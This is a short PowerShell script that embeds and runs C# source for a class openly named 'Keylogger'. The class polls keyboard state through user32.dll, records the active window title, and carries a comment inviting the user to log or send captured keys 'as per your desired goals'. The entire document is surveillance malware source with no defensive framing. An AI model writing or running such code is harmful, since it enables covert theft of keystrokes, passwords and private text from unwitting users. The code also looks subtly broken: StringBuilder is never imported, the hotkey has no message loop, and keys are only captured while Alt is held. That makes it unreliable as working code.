Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class Keylogger {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    
    private const int MOD_ALT = 0x0001;
    private const int WM_HOTKEY = 0x0312;
    
    public void StartKeylogger() {
        if (RegisterHotKey(IntPtr.Zero, 1, MOD_ALT, (uint)Keys.K)) {
            while (true) {
                if (GetForegroundWindow() != IntPtr.Zero) {
                    StringBuilder windowTitle = new StringBuilder(256);
                    GetWindowText(GetForegroundWindow(), windowTitle, windowTitle.Capacity);
                    string currentWindowTitle = windowTitle.ToString();
                    string key = GetKey();
                    // You can log or send the 'key' and 'currentWindowTitle' as per your desired goals.
                }
                System.Threading.Thread.Sleep(100);
            }
        }
    }
    
    private string GetKey() {
        string key = "";
        foreach (Keys k in Enum.GetValues(typeof(Keys))) {
            if (Control.ModifierKeys.HasFlag(Keys.Alt) && !Control.ModifierKeys.HasFlag(Keys.Control) && !Control.ModifierKeys.HasFlag(Keys.Shift)) {
                if (GetAsyncKeyState(k) == -32767) {
                    key = k.ToString();
                    break;
                }
            }
        }
        return key;
    }
    
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(Keys vKey);
}
"@

$logger = New-Object Keylogger
$logger.StartKeylogger()
